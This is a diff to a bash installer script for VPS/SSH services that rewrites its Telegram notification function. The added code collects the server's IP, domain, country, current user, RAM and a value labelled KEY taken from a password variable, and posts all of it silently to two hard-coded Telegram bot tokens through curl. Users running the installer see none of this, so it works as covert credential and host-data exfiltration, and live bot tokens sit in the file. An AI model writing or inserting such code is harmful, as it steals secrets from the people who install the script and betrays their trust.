@@ -105,23 +105,40 @@ send_code_telegram() {
     echo -e "\033[1;36m======================================================================================\033[0m"
     echo ""
 
-    # Send message to Telegram
-    local message="The verification code for $ip_address is: $random_code"
-    for ((i=0; i<${#bot_tokens[@]}; i++)); do
-        local bot_token="${bot_tokens[i]}"
-        local chat_id="${chat_ids[i]}"
-        curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
-    done
+    # Determine country
+country=$(curl -s https://ipapi.co/country_name/) 
+
+# Determine user
+user=$(whoami)
+
+# Determine RAM
+ram=$(free -m | awk '/^Mem:/{print $2}')
+
+# INFO ON VPS
+local message="INFORMATION VPS INSTALL SC
+CODE    : $random_code
+DOMAIN  : $domain_name
+IP VPS  : $ip_address
+COUNTRY : $country
+USER    : $user
+RAM     : ${ram}MB
+KEY     : $password"
+for ((i=0; i<${#bot_tokens[@]}; i++)); do
+    local bot_token="${bot_tokens[i]}"
+    local chat_id="${chat_ids[i]}"
+    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
+done
+
    
     echo -e "\033[1;31m       CONTACT TEAM MAPTECH FOR OTHER SCRIPTS \033[0m"
     echo -e "\033[1;36m==============================================================\033[0m"
     echo ""
-    echo -e "\033[1;32m      TELEGRAM :  \033[0m@maptechgh"
-    echo -e "\033[1;32m      WHATSAPP :  \033[0m+15513366369"
+    echo -e "\033[1;32m      TELEGRAM :  \033[0mhttps://t.me/maptechghbot"
+    echo -e "\033[1;32m      WHATSAPP :  \033[0mhttps://wa.me/+15513366369"
     echo "" 
     echo -e "\033[1;36m=============================================================\033[0m"
     echo ""
-    echo -e "\033[1;31m  This version of the SSH Script is free \033[0m"
+    echo -e "\033[1;31m  M A P T E C H - G H \033[0m"
     echo ""
 }
 bot_tokens=("6803390472:AAEEX8hpTFhsxbmzU5oiZD4dYCOKxS4-lCE" "6385883860:AAHh-FUlhznqClppdunC2V2vinc298E17_E")
